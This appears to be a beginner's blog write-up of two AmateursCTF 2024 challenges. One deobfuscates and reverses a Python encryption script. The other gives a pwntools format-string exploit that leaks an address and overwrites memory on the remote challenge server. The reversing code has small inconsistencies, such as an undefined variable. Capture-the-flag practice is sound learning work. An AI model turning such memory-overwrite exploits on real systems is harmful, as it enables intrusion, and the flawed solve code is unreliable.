# AmateursCTF_2024 Writeups


Writeup for rev challenges in the event.

<!--more-->
## Overview
First time writing writeup hehe.

## typo
{{< admonition note "Challenge Information" >}}
* **Given file:** `mian.py`, `output.txt`
* **Description:** can you make sure i didn't make a typo?
{{< /admonition >}}

We are given a Python source with many obfuscated names, but upon closer inspection we notice that they are all simple encryption method that can be easily decrypted.

After renaming the variables a bit we got:

```Python
import random as RrRrRrrrRrRRrrRRrRRrrRr
seed = int('1665663c', 20)
RrRrRrrrRrRRrrRRrRRrrRr.seed(seed)
flag = bytearray(open('flag.txt', 'rb').read())
key_str = '\r'r'\r''r''\\r'r'\\r\r'r'r''r''\\r'r'r\r'r'r\\r''r'r'r''r''\\r'r'\\r\r'r'r''r''\\r'r'rr\r''\r''r''r\\'r'\r''\r''r\\\r'r'r\r''\rr'
key_array = [
    b'arRRrrRRrRRrRRrRr',
    b'aRrRrrRRrRr',
    b'arRRrrRRrRRrRr',
    b'arRRrRrRRrRr',
    b'arRRrRRrRrrRRrRR'
    b'arRRrrRRrRRRrRRrRr',
    b'arRRrrRRrRRRrRr',
    b'arRRrrRRrRRRrRr'
    b'arRrRrRrRRRrrRrrrR',
]
func_plusone = lambda param: bytearray([ele + 1 for ele in param])
func_minusone = lambda param: bytearray([ele - 1 for ele in param])

def func_swap(hex):
    for id in range(0, len(hex) - 1, 2):
        hex[id], hex[id + 1] = hex[id + 1], hex[id]
    for list in range(1, len(hex) - 1, 2):
        hex[list], hex[list + 1] = hex[list + 1], hex[list]
return hex

func_list = [func_swap, func_plusone, func_minusone]
func_list = [RrRrRrrrRrRRrrRRrRRrrRr.choice(func_list) for arRrrrRRrRRrRRRrRrRrrRr in range(128)]

def execute_func(arr, ar):
    for r in ar:
        arr = func_list[r](arr)
return arr

def func_add(arr, ar):
    ar = int(ar.hex(), 17)
    for r in arr:
        ar += int(r, 35)
return bytes.fromhex(hex(ar)[2:])

ciphertext = execute_func(flag, key_str.encode())
ciphertext = func_add(key_array, ciphertext)
print(ciphertext.hex())
```

We are also provided with the cipher text from the output.txt
ciphertext = `5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3`

From the bottom up, we first subtract the cipher text with the keyarray base 35, we get the new ciphertext = `3510160288463215651882012568783508204641122149206037501475580951860016882936528922912211607208113004344284877774206570`

But here is the catch, notice that the ciphertext now is the result of integer base 17 conversion, so we need to revert it back to a base 17 bytearray, this is not complicated, but sure is very troublesome, luckily we can threw it in an online decoder so that we can get result instead of decode it manually (a good online decoder can be found here: [CyberChef](https://gchq.github.io/CyberChef/) ).

<img src="typo_1.png" alt="" width="1000"/>

And the rest can be decrypt fairly easily.

```Python
def rev_func_swap(hex):
    for id in range(1, len(hex) - 1, 2):
        hex[id], hex[id + 1] = hex[id + 1], hex[id]
    for list in range(0, len(hex) - 1, 2):
        hex[list], hex[list + 1] = hex[list + 1], hex[list]
    return hex

rev_func_list = [rev_func_swap, func_minusone, func_plusone]
rev_func_list = [RrRrRrrrRrRRrrRRrRRrrRr.choice(rev_func_list) for arRrrrRRrRRrRRRrRrRrrRr in range(128)]

def execute_func(arr, ar):
    for r in ar:
        arr = rev_func_list[r](arr)
    return arr
cipher_text = 0x486f67686960685561685568552559536660375b3a5d28625353275d676753595c6029275a712858536067602b646167
cipher_text = bytes.fromhex(hex(cipher_text)[2:])
cipher_text = bytearray(cipher_text)
print(cipher_text)
index_array = [i for i in index_array.encode()]
index_array.reverse()
flag = execute_func(cipher_text, index_array)
print(flag)
```

**amateursCTF{4t_l3ast_th15_fl4g_isn7_misspelll3d}**

## bearsay

Trying some pwn.

```Python
from pwn import *

elf = context.binary = ELF('./chall')
p = process()
p = remote('chal.amt.rs', 1338)
# gdb.attach(p, gdbscript='b*main', api=True) 

p.sendlineafter(b'say: ', b'%15$p')
p.recvline()

bss_is_mother = int(p.recvline().split()[1], 16) + 0x29cc
val = 0xBAD0BAD
payload = fmtstr_payload(22, {bss_is_mother: val}, write_size='int')
p.recvuntil(b'say: ')
print(len(payload))
print(payload)
assert len(payload) < 4096
p.sendline(payload)

p.recvuntil(b'say: ')
p.sendline( b'flag')
p.interactive()
```

**amateursCTF{bearsay_mooooooooooooooooooo?}**
